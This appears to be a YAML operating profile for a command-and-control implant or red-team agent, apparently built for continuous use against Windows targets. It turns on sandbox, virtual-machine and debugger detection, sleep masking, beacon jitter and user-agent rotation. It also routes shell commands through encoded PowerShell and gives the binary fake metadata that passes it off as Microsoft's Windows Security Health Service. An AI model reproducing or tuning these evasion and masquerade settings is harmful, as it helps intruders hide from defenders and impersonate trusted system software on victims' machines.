# OPSEC profile — balanced real-world evasion, 24/7 operation
# Recommended shell timeout: --timeout 180
# Recommended build: include --no-gui for Windows targets
name: opsec
sleep_interval: 60s
jitter_percent: 30
max_retries: 5
enable_sandbox_check: true
enable_vm_check: true
enable_debug_check: true
sleep_masking: true
user_agent_rotation: true
kill_date: ""
working_hours_only: false

# Level 1 evasion
exec_method: powershell     # route all shell commands via PS -EncodedCommand
obfuscate: false            # set true if garble is installed: go install mvdan.cc/garble@latest
masquerade:
  enabled: true
  company: "Microsoft Corporation"
  product: "Windows Security Health"
  description: "Windows Security Health Service"
  original_filename: "SecurityHealthService.exe"
  version: "10.0.19041.1"
